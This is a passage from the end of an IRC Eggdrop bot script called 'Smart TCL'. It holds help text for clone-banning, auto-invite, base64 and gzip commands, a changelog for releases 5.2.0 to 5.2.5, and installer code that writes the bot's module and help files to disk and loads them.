        ('all') for a single channel just type '.clone max \#chan all'
        or ( for all channels ) '.clone max all all'.. ;)
###  %b.clone bantime%b [minutes]
   Sets the ban lifetime for clones. If no value is given, actual
   settings are showed. Default is 10 minutes.
###  %b.clone exempt%b [globalflag or globalflag|channelflag]
   Sets user's flags to exempt from clone-banning. These users can
   freely play with clones..For example, if clone-exempt flags are
   'o|m', user ^Boja^ ( registered as |+m \#test ) and his clones
   are exempted from ban. If no value is given, actual settings
   are showed. Default is 'o|o'.
Note : all bots are also exempted from any punishment.
###  %b.clone msg%b [kick-message]
   Sets the message to show while kickbanning clones. You can use the
   special tag '%%max' to include the maximum number of allowed
   clones for each channel. For example, if max allowed connection
   for channel \#test is '2', unknow nick ^Boja^ has 3 connections on
   test and clone msg is 'no more than %%max connections!', ^Boja^
   will be kickbanned with the message 'no more than 2 connections!'..
See also : .repeat, .spam, .prot, .limit, .eb, .sop, .status, .scan
%{help=vhosts}%{+m|+m}
###  %b.vhosts%b [command]
   Shows a list of available shell-vhosts calling the standard shell
   script 'vhosts'. You can specify an alternative command, for example
   'VHOSTS' or 'Vhost' if the standard fails.
See also : .bounce, .telnet, .ls, .cat
%{help=b64}%{+m}
###  %b.b64 encode%b <data>
   Encodes data using base-64 algorithm ( similar to uuencode ).
###  %b.b64 decode%b <data>
   Decodes data using base-64 algorithm ( similar to uudecode ).
See also : .crypt, .decrypt
%{help=ainv}%{+n}
###  %b.ainv%b
   Shows actual Auto-Invite System configuration and status.
   Auto-Invite System lets you auto-invite users joining a
   particular channel, or just talking on that channel (see
   '#from-channel' below) to other channels (see '#to-channel'
   below).
###  %b.ainv ver%b
   Shows Auto-Invite System version.
###  %b.ainv%b <#from-channel> [#to-channel-1] .. [#to-channel-N]
   Enables auto-invite for #from-channel's users to #to-channels.
   If no '#to-channels' are specified, actual settings are
   displayed. To disable auto-invite for #from-channel, use
   'none' as #to-channel. To modify settings for all channels,
   use 'all' as #from-channel.
###  %b.ainv flag%b <#from-channel> [- / <+/->flag]
   Lets you select which users to invite from #from-channel
   (only '+flag' or '-flag' users will be auto-invited).
   To remove flag-filter, use a '-'. Default (for all) is
   '-' (all users will be invited).
###  %b.ainv boring%b <#from-channel> [on / off]
   Enables or disables boring-mode. Boring mode means that
   each user talking on #from-channel will be periodically
   invited to #to-channels list until he joins #to-channels.
   Default (for all) is off.
###  %b.ainv log%b <#from-channel> [on / off]
   Enables or disables verbose-logging for #from-channel.
   Default (for all) is off.
###  %b.ainv clear%b
   Removes Auto-Invite configuration file. A '.restart' is
   needed to rebuild defaults.
See also: .invite, .allinv, .+invite
%{help=gzip}%{+n}
###  %b.gzip%b <source-file> [dest-file]
   Compresses source-file to dest-file. If no dest-file is
   given, a file named source-file.gz will be created.
See also: .gunzip, .ls, .cp, .mv, .rm, .cat, .find, .get, .send
%{help=gunzip}%{+n}
###  %b.gunzip%b <source-file> [dest-file]
   Decompresses source-file to dest-file. If no dest-file
   is given, a file named source-file.uncompressed will be
   created.
See also: .gzip, .ls, .cp, .mv, .rm, .cat, .find, .get, .send
%{help=ctcp}%{+o}
###  %b.ctcp%b <nick> [type]
   Sends specified CTCP-Request to specified nickname.
See also: .notice, .msg, .ping
%{help=mass}%{-}
###  %b.mass A%b <command>
   Requests info about module 's given command on ALL
   connected bots.
###  %b.mass X%b/%bY%b/%bZ&b/%b..%b <command>
   Requests info about module 's given command only on
   X, Y, or Z flagged bots.
###  %b.mass botname%b[,botname1,botname2,..botnameN] <command>
   Requests info about module 's given command only
   on specified bot (or list of bots).
Note: no spaces in comma-separated list!
###  %b.mass A/X/Y/Z/../botname1,..botnameN%b <command> <newvalue>
   Changes specified module 's command to the new specified
   value on ALL connected bots (A), or only on X, Y, or Z flagged
   bots, or only on specified bot (or list of bots).
Note1: for a list of valid commands see '%b.help module_name%b'..}

if {![info exists help-path]} { global help-path }
if {[file isdirectory ${help-path}]} {
 set smarthelp [file join ${help-path} smart.help]
} else {
 set smarthelp "smart.help"
}

if {(![file exists $smarthelp]) || ([expr abs([string length $smart_help] - [file size $smarthelp])] > 1)} {
 set fileid [open $smarthelp w]
 puts $fileid $smart_help
 close $fileid
    al init "Wrote help system to $smarthelp....."
}
unset smart_help ; unloadhelp smart.help ; loadhelp smart.help
al init "Help system loaded from $smarthelp and ready!"
set help_module_loaded 1
}
set smart_news {########### 20-02-2004 - release 5.2.0 ###########
*New Modules Interfaces System: standard, faster,
 more configurable & powerfull (see docs on web);
*Full Developers Support: '.setup module +module',
 '.setup module info', etc. (see docs on website);
*'.setup': rewrittem/improved/new features;
*'.pack' / '.upgrade': improved to support user
 modules & include them in TCL distribution;
*Help System: rewritten/upgraded/improved;
*'.color': added as Color Mapper module;
*'.cron': added as Crontab Manager module;
*'.prot': Smart Protector v4.2: tons of bugfixes &
 improvements (see '.prot -v' & docs on website);
*'.prot': ported to new modules interfaces system;
*'.probe': enhanced for better error logging;
*Minor bugfixes in SOP module & TCL core.
########### 02-03-2004 - release 5.2.1 ###########
*Modules Interfaces: version 2.3, added support
 for files (%l) in options parser, improved output
 on mass-interfaces, small bug fixes;
*SOP Module (.sop -v): ported to new interfaces;
*'.prot limit': fixed;
*'.prot fake'/'.prot fakex': fixed;
*'.cycle'/'.mcycle': moved as '.sop cycle/mcycle';
*'.sop scycle'/'.sop bcycle': added;
*'.check': moved as '.sop check' + mass interface;
*'.nick' (nick_cycle_autogen): fixed/improved;
*Help System: upgraded.
########### 06-04-2004 - release 5.2.2 ###########
*Modules Interfaces: version 2.5, fixed minor is-
 sues and added suppor for nicknames (%n) in op-
 tions parser;
*Nick Module ('.nick -v'): ported to new interfa-
 ces/improved;
*'.sop ajump random': fixed;
*[sop:mode] (botonchan): fixed;
*'.dcc': added (lets you make the bot call someone
 via dcc-chat);
*'.ajump': added bind facilities to '.sop ajump';
*[wmh ipv6]: fixed (no longer adds ipv6 as ip:v6:*
 but now ip:v6:fixed);
*'.sop sync' (and '.msop A sync'): fixed
*'.sop botserv': implemented replacing old
 '.botserv' (still alive as short-bind);
*'.sop cycle' (and '.msop A cycle'): fixed;
*Smart Protector Module: version 4.4 ('.prot -v')
*Limit Extra Bitch: implemented as '.prot leb' to
 punish people changing limiting settings;
*Limit Extra Bitch Exemption: implemented as
 '.prot lebex' to exempt flagged users from LEB;
*'.prot ebex': fixed/improved;
*'.mchanset A #chan +stnk key': fixed;
*'.botstats': recoded / strongly improved; support
 for verbose mode ('.botstats -v').
########### 12-07-2004 - release 5.2.4 ###########
*'.setup' v2.5: converted as standard primary mo-
 dule with standard syntax and improved features;
*Modules Interfaces: v2.7: major enhancements;
*'.bind -v': Bind Customisation Module: created;
*'.sop' Module: v4.6: added '.sop myhub','.sop rj'
 and '.sop fhl' (see '.sop -v'), fixed major bugs;
*'.color status off': fixed, Color Module v1.1;
*'.prot collide': fixed 'nick_check' bug;
*Help System: improved / updated;
*Tons of minor bugfixes and performance tunings.
########### 20-07-2005 - release 5.2.5 ###########
*Modules Interfaces v 2.8:added module:report,im-
 proved internal data management,added q_test,fi-
 xed %l in modules option parser;
*'.sop' Module v4.7: preliminary support for remo-
 te modes(fully working for remote bans),small in-
 ternal improvements;
*updated & fixed help(.prot bitchub->bh), fixed
 switch in 'clone' module;
*'spam' Module v2.0: many improvements, fixes and
 performance enhancements: see '.spam -v';
*Removed k:lines management: unusefull;
*Tons of bugfixes and minor enhancements.
--------------------------------------------------
}
proc findtclfile {{f ""}} {

    set l ". scripts script .. ../scripts ../script ../.. ../../scripts ../../script"
    foreach t $l { if {[file exists $t/smart.tcl]} { return $t/smart.tcl } }
    set l ". ../ ../../"
    foreach t $l {
	if {[catch {set w [exec find $t -name "smart.tcl"]}] == 0} {
	    if {[file exists [lindex $w 0]]} { return [lindex $w 0] }
	}
    }
    return ""

}

########################################### Installation Stuff ###########################################
putlog "Installing Smart TCL ..." ; set wdir "smartTCL" ; global help-path ; set t [findtclfile]
if {$t == ""} { set t "smart.tcl" }
if {![file exists $wdir] || ![file isdirectory $wdir]} {
    file mkdir $wdir ; file attributes $wdir -permissions 00700
}
if {![info exists help-path] || ${help-path} == ""} { set help-path "help/" }
if {![file exists ${help-path}] || ![file isdirectory ${help-path}]} {
    file mkdir ${help-path} ; file attributes ${help-path} -permissions 00700
}
set setup_nmods "setup sop prot nick bind bnc rep logs clone take spam ainv cron color help "
foreach m $setup_nmods {
    set mv smart_${m} ; set ms ${m}_module_script ; set mh smart_${m}_help
    set $ms "$wdir/smart.$m.tcl" ; set fd [open [expr $${ms}] w]
    fconfigure $fd -translation auto ; puts -nonewline $fd [expr $${mv}] ; close $fd ; unset $mv
    if {[info exists $mh]} {
	set hf [file join ${help-path} "smart.$m.help"] ; set fd [open $hf w]
	fconfigure $fd -translation auto ; puts -nonewline $fd [expr $${mh}] ; close $fd
	unset hf ; unset $mh
    }
}
if {[info exists smart_news]} {
    set fd [open "$wdir/smart.news" w] ; fconfigure $fd -translation auto
    puts -nonewline $fd $smart_news ; close $fd ; unset smart_news
}
set fd [open $t w] ; fconfigure $fd -translation auto
puts -nonewline $fd $smart_core ; close $fd ; unset smart_core ; after 3000 ; source $t
##########################################################################################################
